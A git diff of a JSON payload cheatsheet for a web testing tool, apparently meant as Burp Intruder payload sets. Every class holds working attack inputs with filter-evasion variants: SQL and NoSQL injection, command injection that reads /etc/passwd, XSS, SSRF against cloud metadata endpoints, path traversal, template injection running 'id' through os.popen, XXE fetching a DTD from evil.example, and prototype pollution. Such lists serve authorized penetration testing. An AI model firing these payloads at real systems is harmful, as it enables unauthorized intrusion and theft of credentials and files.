@@ -1,70 +1,313 @@
 {
-  "_comment": "Payload cheatsheets for parameter classes (ParameterClassifier) and injection-category findings (FindingTaxonomy). Each set has 'basic' (plain probes) and 'bypass' (case/encoding/comment/filter-evasion variants of the same idea) tiers. Passive reference only -- ReconHub never sends these itself; shown in a read-only dialog and registered as two Burp Intruder payload sets per class (basic / bypass). Tune/add freely.",
+  "_comment": "Enhanced Payload Cheatsheets for Burp Intruder & Passive ReconHub. Contains basic probes, modern WAF evasions, framework-specific tricks, and critical injection classes.",
   "sets": [
-    { "class": "IDOR",
-      "note": "Swap this value with another user's/account's own ID (using a second authenticated session) to test authorization, not identity guessing.",
-      "basic": ["0", "1", "-1", "9999999", "00", "0x1", "<replace with another account's own id>"],
-      "bypass": ["id[]=1", "id[]=1&id[]=2", "%31", "+1", "01", "1.0", "1e0", "0001", "1%00", "1;",
-        "1,2", "1 OR 1", "{\"id\":1}", "[1]"] },
-
-    { "class": "Redirect/SSRF",
-      "note": "Watch for the app following the value server-side (SSRF) or the browser redirecting (open redirect). Bypass variants target allowlist/regex checks on the host.",
-      "basic": ["https://evil.example/", "//evil.example", "///evil.example", "http://evil.example",
-        "https:evil.example", "http://169.254.169.254/latest/meta-data/", "http://localhost/",
-        "http://127.0.0.1/", "javascript:alert(1)", "/\\evil.example"],
-      "bypass": ["https://allowed.com.evil.example/", "https://evil.example#allowed.com",
-        "https://evil.example?allowed.com", "https://allowed.com@evil.example/",
-        "https://evil.example\\@allowed.com/", "https://allowed.com%2F@evil.example/",
-        "http://0x7f000001/", "http://2130706433/", "http://017700000001/", "http://[::1]/",
-        "http://[::ffff:127.0.0.1]/", "https://evil%2Eexample/", "https://evil․example/",
-        "%2568ttp://evil.example", "https:/\\evil.example", "https://evil.example%2f%2e%2e"] },
-
-    { "class": "File/Path",
-      "note": "Path traversal / local file read candidates. Bypass variants defeat naive '../' stripping and depth limits.",
-      "basic": ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "....//....//etc/passwd",
-        "..\\..\\..\\..\\windows\\win.ini", "/etc/passwd", "file:///etc/passwd", "..;/etc/passwd"],
-      "bypass": ["..%252f..%252f..%252fetc%252fpasswd", "..%c0%af..%c0%afetc%c0%afpasswd",
-        "..%25c0%25afetc%25c0%25afpasswd", "....\\/....\\/....\\/etc/passwd",
-        "..././..././..././etc/passwd", "/etc/passwd%00", "/etc/passwd%00.png",
-        "php://filter/convert.base64-encode/resource=index.php", "php://filter/read=string.rot13/resource=index.php",
-        "..\\..\\..\\..\\windows\\win.ini%00.jpg", "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
-        "..∕..∕..∕etc∕passwd"] },
-
-    { "class": "SQLi/Sort",
-      "note": "Quick manual probes; for a full boundary-driven scan see InjectScope. Bypass variants use comments/case/whitespace/encoding to slip past naive keyword filters.",
-      "basic": ["'", "\"", "' OR '1'='1", "' OR '1'='1'-- -", "' ORDER BY 1-- -", "' ORDER BY 99-- -",
-        "' UNION SELECT NULL-- -", "1 OR 1=1"],
-      "bypass": ["'/**/OR/**/'1'='1", "'/**/UNION/**/SELECT/**/NULL-- -", "' oR '1'='1",
-        "'%0aOR%0a'1'='1", "'%0dOR%0d'1'='1", "'+OR+'1'='1", "'||'1'='1", "'|| '1'='1' /*",
-        "%2527%2520OR%25201%3D1", "' OR/**/1=1#", "'/*!50000OR*/'1'='1", "1/**/UNION/**/SELECT/**/1",
-        "'%09OR%091=1", "' OR TRUE-- -", "' OR 'a'='a"] },
-
-    { "class": "Command",
-      "note": "OS command injection markers (look for timing/output changes). Bypass variants dodge naive space/keyword blacklists.",
-      "basic": ["; id", "| id", "$(id)", "`id`", "; sleep 5", "| sleep 5", "&& ping -n 3 127.0.0.1"],
-      "bypass": [";{cat,/etc/passwd}", ";cat</etc/passwd", "|cat$IFS/etc/passwd", ";cat$IFS$9/etc/passwd",
-        ";c\\at /etc/passwd", ";c'a't /etc/passwd", ";ca\"\"t /etc/passwd", "%0acat%20/etc/passwd",
-        "%0Aid%0A", ";${IFS}id", ";id;", "|whoami#", "$(echo${IFS}dGVzdA==|base64${IFS}-d)",
-        "/???/??t${IFS}/???/p??s??" ] },
-
-    { "class": "XSS", "findingTypeContains": ["reflected param"],
-      "note": "Reflected-XSS breakout probes for a parameter already observed reflecting unencoded. Bypass variants dodge naive tag/keyword filters and lowercase-only blacklists.",
-      "basic": ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><svg/onload=alert(1)>",
-        "\"><img src=x onerror=alert(1)>", "javascript:alert(1)", "'-alert(1)-'"],
-      "bypass": ["<ScRiPt>alert(1)</sCriPt>", "<svg%0Aonload=alert(1)>", "\"><svg%09onload=alert(1)>",
-        "<img src=x oNerror=alert(1)>", "<details open ontoggle=alert(1)>",
-        "<body onload=alert(1)>", "javascript:/**/alert(1)", "<svg><script>alert(1)</script></svg>",
-        "<img src=x:alert(1) onerror=eval(src)>", "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
-        "<a href=javascript&colon;alert(1)>x</a>", "\"><iframe/onload=alert(1)>",
-        "<svg onload=alert`1`>", "<img/src/onerror=alert(1)>"] },
-
-    { "class": "Open Redirect", "findingTypeContains": ["open redirect"],
-      "note": "Confirm the app actually redirects to an attacker-controlled host. Bypass variants target allowlist/regex checks on the redirect target.",
-      "basic": ["https://evil.example/", "//evil.example", "///evil.example", "https:evil.example",
-        "/%09/evil.example", "/\\evil.example"],
-      "bypass": ["https://allowed.com@evil.example/", "https://evil.example\\@allowed.com",
-        "//%2Fevil.example", "/%2F%2Fevil.example", "https:/\\evil.example",
-        "/\\/evil.example", "https://allowed.com.evil.example/", "/%0a/evil.example",
-        "/\t/evil.example", "https://evil%2Eexample"] }
+    {
+      "class": "IDOR",
+      "note": "Swap with another user's/account's ID using a second authenticated session. Bypass probes test type confusion, array wrapping, and JSON mutations.",
+      "basic": [
+        "0",
+        "1",
+        "-1",
+        "9999999",
+        "00",
+        "0x1",
+        "00000000-0000-0000-0000-000000000000",
+        "<replace_with_target_id>"
+      ],
+      "bypass": [
+        "id[]=1",
+        "id[]=1&id[]=2",
+        "id[id]=1",
+        "%31",
+        "+1",
+        "01",
+        "1.0",
+        "1e0",
+        "0001",
+        "1%00",
+        "1;",
+        "1,2",
+        "1 OR 1",
+        "{\"id\":1}",
+        "[1]",
+        "{\"id\":{\"8697\":\"1\"}}",
+        "true",
+        "null"
+      ]
+    },
+    {
+      "class": "Redirect/SSRF",
+      "note": "Targets internal metadata services (AWS/GCP/Azure), local interfaces, and host-header/allowlist regex bypasses.",
+      "basic": [
+        "https://evil.example/",
+        "//evil.example",
+        "///evil.example",
+        "http://evil.example",
+        "https:evil.example",
+        "http://169.254.169.254/latest/meta-data/",
+        "http://localhost/",
+        "http://127.0.0.1/",
+        "javascript:alert(1)",
+        "/\\evil.example"
+      ],
+      "bypass": [
+        "https://allowed.com.evil.example/",
+        "https://evil.example#allowed.com",
+        "https://evil.example?allowed.com",
+        "https://allowed.com@evil.example/",
+        "https://evil.example\\@allowed.com/",
+        "https://allowed.com%2F@evil.example/",
+        "http://0x7f000001/",
+        "http://2130706433/",
+        "http://017700000001/",
+        "http://[::1]/",
+        "http://[::ffff:127.0.0.1]/",
+        "http://127.1/",
+        "http://127.0.0.1.nip.io",
+        "http://169.254.169.254.nip.io",
+        "http://[0:0:0:0:0:ffff:169.254.169.254]",
+        "https://evil%2Eexample/",
+        "https://evil․example/",
+        "%2568ttp://evil.example",
+        "https:/\\evil.example",
+        "https://evil.example%2f%2e%2e",
+        "http://169.254.169.254/latest/user-data/",
+        "http://metadata.google.internal/computeMetadata/v1/"
+      ]
+    },
+    {
+      "class": "File/Path",
+      "note": "Path traversal and LFI probes. Targets double encoding, nested stripping, OS device files, and wrapper streams.",
+      "basic": [
+        "../../../../etc/passwd",
+        "..%2f..%2f..%2f..%2fetc%2fpasswd",
+        "....//....//etc/passwd",
+        "..\\..\\..\\..\\windows\\win.ini",
+        "/etc/passwd",
+        "file:///etc/passwd",
+        "..;/etc/passwd"
+      ],
+      "bypass": [
+        "..%252f..%252f..%252fetc%252fpasswd",
+        "..%c0%af..%c0%afetc%c0%afpasswd",
+        "..%25c0%25afetc%25c0%25afpasswd",
+        "....\\/....\\/....\\/etc/passwd",
+        "..././..././..././etc/passwd",
+        "/etc/passwd%00",
+        "/etc/passwd%00.png",
+        "php://filter/convert.base64-encode/resource=index.php",
+        "php://filter/read=string.rot13/resource=index.php",
+        "php://filter/zlib.deflate/read=string.rot13/resource=index.php",
+        "..\\..\\..\\..\\windows\\win.ini%00.jpg",
+        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        "..∕..∕..∕etc∕passwd",
+        "/proc/self/environ",
+        "/proc/self/cmdline",
+        "\\\\127.0.0.1\\c$\\windows\\win.ini",
+        "c:/windows/win.ini",
+        "CON",
+        "NUL"
+      ]
+    },
+    {
+      "class": "SQLi/Sort",
+      "note": "Manual quick probes for RDBMS and NoSQL. Bypass variants leverage comment techniques, whitespace alternatives, and inline queries.",
+      "basic": [
+        "'",
+        "\"",
+        "' OR '1'='1",
+        "' OR '1'='1'-- -",
+        "' ORDER BY 1-- -",
+        "' ORDER BY 99-- -",
+        "' UNION SELECT NULL-- -",
+        "1 OR 1=1"
+      ],
+      "bypass": [
+        "'/**/OR/**/'1'='1",
+        "'/**/UNION/**/SELECT/**/NULL-- -",
+        "' oR '1'='1",
+        "'%0aOR%0a'1'='1",
+        "'%0dOR%0d'1'='1",
+        "'+OR+'1'='1",
+        "'||'1'='1",
+        "'|| '1'='1' /*",
+        "%2527%2520OR%25201%3D1",
+        "' OR/**/1=1#",
+        "'/*!50000OR*/'1'='1",
+        "1/**/UNION/**/SELECT/**/1",
+        "'%09OR%091=1",
+        "' OR TRUE-- -",
+        "' OR 'a'='a",
+        "admin'--",
+        "' SLEEP(5)#",
+        "';WAITFOR DELAY '0:0:5'--",
+        "1' AND 1=(SELECT 1 FROM (SELECT SLEEP(5))a)--",
+        "{\"$ne\": null}"
+      ]
+    },
+    {
+      "class": "Command",
+      "note": "OS command injection markers (OOB, timing, and direct output). Bypasses target space, string concatenation, and path restrictions.",
+      "basic": [
+        "; id",
+        "| id",
+        "$(id)",
+        "`id`",
+        "; sleep 5",
+        "| sleep 5",
+        "&& ping -n 3 127.0.0.1"
+      ],
+      "bypass": [
+        ";{cat,/etc/passwd}",
+        ";cat</etc/passwd",
+        "|cat$IFS/etc/passwd",
+        ";cat$IFS$9/etc/passwd",
+        ";c\\at /etc/passwd",
+        ";c'a't /etc/passwd",
+        ";ca\"\"t /etc/passwd",
+        "%0acat%20/etc/passwd",
+        "%0Aid%0A",
+        ";${IFS}id",
+        ";id;",
+        "|whoami#",
+        "$(echo${IFS}dGVzdA==|base64${IFS}-d)",
+        "/???/??t${IFS}/???/p??s??",
+        "%0Aping%20-c%205%20127.0.0.1%0A",
+        ";`which$IFS'id'`",
+        "a;id",
+        "a'|id'",
+        "a\"|id\""
+      ]
+    },
+    {
+      "class": "XSS",
+      "findingTypeContains": [
+        "reflected param"
+      ],
+      "note": "Context-aware Reflected/DOM XSS probes for unescaped reflections. Bypass variants target modern JS frameworks and strict WAF filters.",
+      "basic": [
+        "<script>alert(1)</script>",
+        "\"><script>alert(1)</script>",
+        "'><svg/onload=alert(1)>",
+        "\"><img src=x onerror=alert(1)>",
+        "javascript:alert(1)",
+        "'-alert(1)-'"
+      ],
+      "bypass": [
+        "<ScRiPt>alert(1)</sCriPt>",
+        "<svg%0Aonload=alert(1)>",
+        "\"><svg%09onload=alert(1)>",
+        "<img src=x oNerror=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "<body onload=alert(1)>",
+        "javascript:/**/alert(1)",
+        "<svg><script>alert(1)</script></svg>",
+        "<img src=x:alert(1) onerror=eval(src)>",
+        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
+        "<a href=javascript&colon;alert(1)>x</a>",
+        "\"><iframe/onload=alert(1)>",
+        "<svg onload=alert`1`>",
+        "<img/src/onerror=alert(1)>",
+        "{{constructor.constructor('alert(1)')()}}",
+        "${alert(1)}",
+        "java%0ascript:alert(1)",
+        "<math><x/xlink:href=javascript:alert(1)>click"
+      ]
+    },
+    {
+      "class": "Open Redirect",
+      "findingTypeContains": [
+        "open redirect"
+      ],
+      "note": "Validates open redirect behavior. Bypasses target regex, domain allowlists, and URL parser mismatch vulnerabilities.",
+      "basic": [
+        "https://evil.example/",
+        "//evil.example",
+        "///evil.example",
+        "https:evil.example",
+        "/%09/evil.example",
+        "/\\evil.example"
+      ],
+      "bypass": [
+        "https://allowed.com@evil.example/",
+        "https://evil.example\\@allowed.com",
+        "//%2Fevil.example",
+        "/%2F%2Fevil.example",
+        "https:/\\evil.example",
+        "/\\/evil.example",
+        "https://allowed.com.evil.example/",
+        "/%0a/evil.example",
+        "/\t/evil.example",
+        "https://evil%2Eexample",
+        "//evil.example/%2e%2e",
+        "https://allowed.com#.evil.example"
+      ]
+    },
+    {
+      "class": "SSTI",
+      "note": "Server-Side Template Injection probes across Jinja2, Twig, Freemarker, Smarty, and SpEL.",
+      "basic": [
+        "{{7*7}}",
+        "${7*7}",
+        "<%= 7*7 %>",
+        "#{7*7}",
+        "*{7*7}"
+      ],
+      "bypass": [
+        "{{'7'*7}}",
+        "${{7*7}}",
+        "#{T(java.lang.Math).abs(-7)}",
+        "{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex(\"id\") }"
+      ]
+    },
+    {
+      "class": "XXE",
+      "contentTypeContains": ["xml", "soap"],
+      "note": "XML External Entity injection probes for local file disclosure or SSRF. Surfaced on endpoints whose Content-Type carries XML/SOAP -- inject inside the body's DOCTYPE.",
+      "basic": [
+        "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><a >&test;</a>",
+        "<?xml version=\"1.0\"?><!DOCTYPE a [<!ENTITY test SYSTEM \"http://evil.example/\">]><a >&test;</a>"
+      ],
+      "bypass": [
+        "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> %xxe;]>",
+        "<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADw-+ACE-DOCTYPE foo+ADw-+ACE-ENTITY xxe SYSTEM +ACI-http://evil.example+ACI-+AD4-+AD4-",
+        "<!DOCTYPE a SYSTEM \"http://evil.example/evil.dtd\">"
+      ]
+    },
+    {
+      "class": "Prototype Pollution",
+      "note": "Client/server-side JS prototype pollution via object-merge/clone sinks (lodash merge, JSON.parse+assign, query-string parsers). Best tried on JSON-body parameters — check for a polluted 'test' property appearing on unrelated objects afterward.",
+      "basic": [
+        "__proto__[test]=1337",
+        "constructor[prototype][test]=1337",
+        "{\"__proto__\":{\"test\":1337}}"
+      ],
+      "bypass": [
+        "__proto__.test=1337",
+        "__proto__[test]={\"a\":\"b\"}",
+        "constructor.prototype.test=1337",
+        "{\"constructor\":{\"prototype\":{\"test\":1337}}}",
+        "{\"a\":{\"__proto__\":{\"test\":1337}}}",
+        "a[__proto__][test]=1337"
+      ]
+    },
+    {
+      "class": "Deserialization",
+      "note": "Detection-only: valid/malformed blobs to fingerprint a deserialization sink from the error it produces (ObjectInputStream trace, unserialize() notice, BinaryFormatter/pickle error) -- not exploit payloads. A confirmed sink needs dedicated gadget-chain tooling (e.g. ysoserial), not included here.",
+      "basic": [
+        "rO0ABXQABHRlc3Q=",
+        "O:8:\"stdClass\":0:{}",
+        "gAROLg=="
+      ],
+      "bypass": [
+        "rO0ABXNy",
+        "O:8:\"stdClass\":1:{}",
+        "a:1:{s:4:\"test\";",
+        "gAQ",
+        "/wEPDwUJ"
+      ]
+    }
   ]
 }
